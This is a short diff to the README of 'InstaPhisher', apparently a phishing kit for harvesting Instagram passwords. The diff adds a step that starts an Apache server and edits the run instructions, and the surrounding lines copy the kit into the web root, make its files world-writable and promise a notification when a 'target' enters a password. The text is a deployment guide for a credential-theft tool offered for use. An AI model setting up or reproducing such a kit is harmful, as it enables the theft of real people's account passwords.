@@ -36,6 +36,7 @@ cd InstaPhisher
 cp * -r '/var/www/html'
 cd /var/www/html
 sudo chmod +777 login.php && sudo chmod +777 InstaPhisher.py
+service apache2 start
 python InstaPhisher.py
 ```
 
@@ -55,12 +56,8 @@ python InstaPhisher.py
 
 Linux:
 ```
-python InstaPhisher.py
-```
-
-Windows:
-```
-InstaPhisher.py
+service apache2 start
+python InstaPhisher.py  #Not required but recommended
 ```
 
 When your target has entered his password, you will receive a message and a sound notification :
